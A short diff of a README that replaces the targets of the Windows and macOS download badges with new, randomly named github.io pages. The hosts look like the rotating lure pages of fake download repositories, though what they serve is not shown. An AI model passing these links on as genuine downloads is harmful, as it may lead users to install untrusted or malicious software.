@@ -64,7 +64,7 @@ That's it. Reverting is also one click.
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows)](https://wsxuvucepnao.github.io/dl2/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows)](https://yauutchdikpr.github.io/win-download/)
 
 </div>
 
@@ -72,7 +72,7 @@ That's it. Reverting is also one click.
 
 <div align="center">
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple)](https://wsxuvucepnao.github.io/mac2/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple)](https://yauutchdikpr.github.io/mac-download/)
 
 </div>
 
